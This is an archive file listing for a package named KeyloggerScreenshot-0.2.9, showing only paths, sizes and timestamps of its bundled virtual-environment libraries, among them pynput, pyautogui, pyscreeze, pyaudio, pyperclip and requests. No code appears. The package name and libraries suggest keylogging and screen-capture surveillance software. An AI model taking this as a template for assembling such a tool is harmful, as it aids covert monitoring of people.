--rw-rw-rw-   0        0        0     7097 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/urllib3/contrib/socks.py
--rw-rw-rw-   0        0        0     8217 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/urllib3/exceptions.py
--rw-rw-rw-   0        0        0     8579 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/urllib3/fields.py
--rw-rw-rw-   0        0        0     2440 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/urllib3/filepost.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:37.930515 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/urllib3/packages/
--rw-rw-rw-   0        0        0        0 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/urllib3/packages/__init__.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:37.944140 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/urllib3/packages/backports/
--rw-rw-rw-   0        0        0        0 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/urllib3/packages/backports/__init__.py
--rw-rw-rw-   0        0        0     1417 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/urllib3/packages/backports/makefile.py
--rw-rw-rw-   0        0        0    34665 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/urllib3/packages/six.py
--rw-rw-rw-   0        0        0    19786 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/urllib3/poolmanager.py
--rw-rw-rw-   0        0        0     5985 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/urllib3/request.py
--rw-rw-rw-   0        0        0    30109 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/urllib3/response.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:38.098586 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/urllib3/util/
--rw-rw-rw-   0        0        0     1155 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/urllib3/util/__init__.py
--rw-rw-rw-   0        0        0     4901 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/urllib3/util/connection.py
--rw-rw-rw-   0        0        0     1605 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/urllib3/util/proxy.py
--rw-rw-rw-   0        0        0      498 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/urllib3/util/queue.py
--rw-rw-rw-   0        0        0     3997 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/urllib3/util/request.py
--rw-rw-rw-   0        0        0     3510 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/urllib3/util/response.py
--rw-rw-rw-   0        0        0    22001 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/urllib3/util/retry.py
--rw-rw-rw-   0        0        0    17177 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/urllib3/util/ssl_.py
--rw-rw-rw-   0        0        0     5758 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/urllib3/util/ssl_match_hostname.py
--rw-rw-rw-   0        0        0     6895 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/urllib3/util/ssltransport.py
--rw-rw-rw-   0        0        0    10003 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/urllib3/util/timeout.py
--rw-rw-rw-   0        0        0    14287 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/urllib3/util/url.py
--rw-rw-rw-   0        0        0     5403 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/urllib3/util/wait.py
--rw-rw-rw-   0        0        0      469 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/vendor.txt
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:38.160210 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/webencodings/
--rw-rw-rw-   0        0        0    10579 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/webencodings/__init__.py
--rw-rw-rw-   0        0        0     8979 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/webencodings/labels.py
--rw-rw-rw-   0        0        0     1305 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/webencodings/mklabels.py
--rw-rw-rw-   0        0        0     6563 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/webencodings/tests.py
--rw-rw-rw-   0        0        0     4307 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_vendor/webencodings/x_user_defined.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:32.320846 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip-22.3.1.dist-info/
--rw-rw-rw-   0        0        0     1093 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip-22.3.1.dist-info/LICENSE.txt
--rw-rw-rw-   0        0        0      125 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip-22.3.1.dist-info/entry_points.txt
--rw-rw-rw-   0        0        0        4 2023-03-16 07:26:11.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip-22.3.1.dist-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:38.178378 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/
--rw-rw-rw-   0        0        0   108568 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/__init__.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:38.213236 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/
--rw-rw-rw-   0        0        0        0 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/__init__.py
--rw-rw-rw-   0        0        0    24701 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/appdirs.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:38.318437 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/importlib_resources/
--rw-rw-rw-   0        0        0      506 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/importlib_resources/__init__.py
--rw-rw-rw-   0        0        0     4504 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/importlib_resources/_adapters.py
--rw-rw-rw-   0        0        0     2741 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/importlib_resources/_common.py
--rw-rw-rw-   0        0        0     2706 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/importlib_resources/_compat.py
--rw-rw-rw-   0        0        0      884 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/importlib_resources/_itertools.py
--rw-rw-rw-   0        0        0     3494 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/importlib_resources/_legacy.py
--rw-rw-rw-   0        0        0     3886 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/importlib_resources/abc.py
--rw-rw-rw-   0        0        0     3566 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/importlib_resources/readers.py
--rw-rw-rw-   0        0        0     2836 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/importlib_resources/simple.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:38.348626 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/jaraco/
--rw-rw-rw-   0        0        0        0 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/jaraco/__init__.py
--rw-rw-rw-   0        0        0     5420 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/jaraco/context.py
--rw-rw-rw-   0        0        0    13515 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/jaraco/functools.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:38.362202 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/jaraco/text/
--rw-rw-rw-   0        0        0    15526 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/jaraco/text/__init__.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:38.403633 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/more_itertools/
--rw-rw-rw-   0        0        0       83 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/more_itertools/__init__.py
--rw-rw-rw-   0        0        0   132569 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/more_itertools/more.py
--rw-rw-rw-   0        0        0    18410 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/more_itertools/recipes.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:38.498524 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/packaging/
--rw-rw-rw-   0        0        0      661 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/packaging/__about__.py
--rw-rw-rw-   0        0        0      497 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/packaging/__init__.py
--rw-rw-rw-   0        0        0    11488 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/packaging/_manylinux.py
--rw-rw-rw-   0        0        0     4378 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/packaging/_musllinux.py
--rw-rw-rw-   0        0        0     1431 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/packaging/_structures.py
--rw-rw-rw-   0        0        0     8496 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/packaging/markers.py
--rw-rw-rw-   0        0        0     4706 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/packaging/requirements.py
--rw-rw-rw-   0        0        0    30110 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/packaging/specifiers.py
--rw-rw-rw-   0        0        0    15699 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/packaging/tags.py
--rw-rw-rw-   0        0        0     4200 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/packaging/utils.py
--rw-rw-rw-   0        0        0    14665 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/packaging/version.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:38.608554 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/pyparsing/
--rw-rw-rw-   0        0        0     9159 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/pyparsing/__init__.py
--rw-rw-rw-   0        0        0     6426 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/pyparsing/actions.py
--rw-rw-rw-   0        0        0    12936 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/pyparsing/common.py
--rw-rw-rw-   0        0        0   213310 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/pyparsing/core.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:38.623626 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/pyparsing/diagram/
--rw-rw-rw-   0        0        0    23668 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/pyparsing/diagram/__init__.py
--rw-rw-rw-   0        0        0     9023 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/pyparsing/exceptions.py
--rw-rw-rw-   0        0        0    39129 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/pyparsing/helpers.py
--rw-rw-rw-   0        0        0    25341 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/pyparsing/results.py
--rw-rw-rw-   0        0        0    13402 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/pyparsing/testing.py
--rw-rw-rw-   0        0        0    10787 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/pyparsing/unicode.py
--rw-rw-rw-   0        0        0     6805 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/pyparsing/util.py
--rw-rw-rw-   0        0        0     8425 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/_vendor/zipp.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:38.633179 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/extern/
--rw-rw-rw-   0        0        0     2426 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pkg_resources/extern/__init__.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:38.648396 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pyaudio/
--rw-rw-rw-   0        0        0    36914 2023-03-16 07:27:03.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pyaudio/__init__.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:38.708338 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pyautogui/
--rw-rw-rw-   0        0        0    80963 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pyautogui/__init__.py
--rw-rw-rw-   0        0        0       58 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pyautogui/__main__.py
--rw-rw-rw-   0        0        0        0 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pyautogui/_pyautogui_java.py
--rw-rw-rw-   0        0        0    15261 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pyautogui/_pyautogui_osx.py
--rw-rw-rw-   0        0        0    20633 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pyautogui/_pyautogui_win.py
--rw-rw-rw-   0        0        0    15759 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pyautogui/_pyautogui_x11.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:38.744297 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pygetwindow/
--rw-rw-rw-   0        0        0    10398 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pygetwindow/__init__.py
--rw-rw-rw-   0        0        0     7102 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pygetwindow/_pygetwindow_macos.py
--rw-rw-rw-   0        0        0    13227 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pygetwindow/_pygetwindow_win.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:38.768544 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pymsgbox/
--rw-rw-rw-   0        0        0    14576 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pymsgbox/__init__.py
--rw-rw-rw-   0        0        0     5079 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pymsgbox/_native_win.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:38.791913 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pynput/
--rw-rw-rw-   0        0        0     1334 2023-03-16 07:26:52.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pynput/__init__.py
--rw-rw-rw-   0        0        0      775 2023-03-16 07:26:52.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pynput/_info.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:38.908315 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pynput/_util/
--rw-rw-rw-   0        0        0    14327 2023-03-16 07:26:52.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pynput/_util/__init__.py
--rw-rw-rw-   0        0        0     8654 2023-03-16 07:26:52.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pynput/_util/darwin.py
--rw-rw-rw-   0        0        0     1512 2023-03-16 07:26:52.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pynput/_util/darwin_vks.py
--rw-rw-rw-   0        0        0     2813 2023-03-16 07:26:52.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pynput/_util/uinput.py
--rw-rw-rw-   0        0        0    18110 2023-03-16 07:26:52.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pynput/_util/win32.py
--rw-rw-rw-   0        0        0     2894 2023-03-16 07:26:52.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pynput/_util/win32_vks.py
--rw-rw-rw-   0        0        0    15103 2023-03-16 07:26:52.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pynput/_util/xorg.py
--rw-rw-rw-   0        0        0    69338 2023-03-16 07:26:52.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pynput/_util/xorg_keysyms.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:38.988525 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pynput/keyboard/
--rw-rw-rw-   0        0        0     7208 2023-03-16 07:26:52.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pynput/keyboard/__init__.py
--rw-rw-rw-   0        0        0    22399 2023-03-16 07:26:52.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pynput/keyboard/_base.py
--rw-rw-rw-   0        0        0    11314 2023-03-16 07:26:52.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pynput/keyboard/_darwin.py
--rw-rw-rw-   0        0        0      895 2023-03-16 07:26:52.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pynput/keyboard/_dummy.py
--rw-rw-rw-   0        0        0    14398 2023-03-16 07:26:52.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pynput/keyboard/_uinput.py
--rw-rw-rw-   0        0        0    10829 2023-03-16 07:26:52.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pynput/keyboard/_win32.py
--rw-rw-rw-   0        0        0    21888 2023-03-16 07:26:52.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pynput/keyboard/_xorg.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:39.063219 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pynput/mouse/
--rw-rw-rw-   0        0        0     2576 2023-03-16 07:26:52.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pynput/mouse/__init__.py
--rw-rw-rw-   0        0        0     8445 2023-03-16 07:26:52.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pynput/mouse/_base.py
--rw-rw-rw-   0        0        0     6735 2023-03-16 07:26:52.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pynput/mouse/_darwin.py
--rw-rw-rw-   0        0        0      874 2023-03-16 07:26:52.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pynput/mouse/_dummy.py
--rw-rw-rw-   0        0        0     6827 2023-03-16 07:26:52.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pynput/mouse/_win32.py
--rw-rw-rw-   0        0        0     5425 2023-03-16 07:26:52.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pynput/mouse/_xorg.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:38.803469 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pynput-1.7.6.dist-info/
--rw-rw-rw-   0        0        0        7 2023-03-16 07:26:52.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pynput-1.7.6.dist-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:39.088584 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pyperclip/
--rw-rw-rw-   0        0        0    26043 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pyperclip/__init__.py
--rw-rw-rw-   0        0        0      765 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pyperclip/__main__.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:39.121098 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pyperclip-1.8.2.dist-info/
--rw-rw-rw-   0        0        0     1925 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pyperclip-1.8.2.dist-info/AUTHORS.txt
--rw-rw-rw-   0        0        0     1514 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pyperclip-1.8.2.dist-info/LICENSE.txt
--rw-rw-rw-   0        0        0       10 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pyperclip-1.8.2.dist-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:39.133681 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pyrect/
--rw-rw-rw-   0        0        0    50395 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pyrect/__init__.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:39.140761 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pyscreeze/
--rw-rw-rw-   0        0        0    25135 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pyscreeze/__init__.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:39.158679 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pytweening/
--rw-rw-rw-   0        0        0    16939 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pytweening/__init__.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:39.178591 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pytweening-1.0.4.dist-info/
--rw-rw-rw-   0        0        0      369 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pytweening-1.0.4.dist-info/AUTHORS.txt
--rw-rw-rw-   0        0        0     1514 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pytweening-1.0.4.dist-info/LICENSE.txt
--rw-rw-rw-   0        0        0       11 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pytweening-1.0.4.dist-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:39.348232 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/requests/
--rw-rw-rw-   0        0        0     4972 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/requests/__init__.py
--rw-rw-rw-   0        0        0      435 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/requests/__version__.py
--rw-rw-rw-   0        0        0     1397 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/requests/_internal_utils.py
--rw-rw-rw-   0        0        0    21287 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/requests/adapters.py
--rw-rw-rw-   0        0        0     6377 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/requests/api.py
--rw-rw-rw-   0        0        0    10187 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/requests/auth.py
--rw-rw-rw-   0        0        0      429 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/requests/certs.py
--rw-rw-rw-   0        0        0     1451 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/requests/compat.py
--rw-rw-rw-   0        0        0    18560 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/requests/cookies.py
--rw-rw-rw-   0        0        0     3811 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/requests/exceptions.py
--rw-rw-rw-   0        0        0     3875 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/requests/help.py
--rw-rw-rw-   0        0        0      733 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/requests/hooks.py
--rw-rw-rw-   0        0        0    35223 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/requests/models.py
--rw-rw-rw-   0        0        0      957 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/requests/packages.py
--rw-rw-rw-   0        0        0    30180 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/requests/sessions.py
--rw-rw-rw-   0        0        0     4235 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/requests/status_codes.py
--rw-rw-rw-   0        0        0     2912 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/requests/structures.py
--rw-rw-rw-   0        0        0    33228 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/requests/utils.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:39.359870 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/requests-2.28.2.dist-info/
--rw-rw-rw-   0        0        0        9 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/requests-2.28.2.dist-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:39.728416 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/
--rw-rw-rw-   0        0        0     8429 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/__init__.py
--rw-rw-rw-   0        0        0      218 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_deprecation_warning.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:40.143525 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/
--rw-rw-rw-   0        0        0      537 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/__init__.py
--rw-rw-rw-   0        0        0     1330 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/_collections.py
--rw-rw-rw-   0        0        0      411 2023-03-16 07:26:07.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/setuptools/_distutils/_functools.py
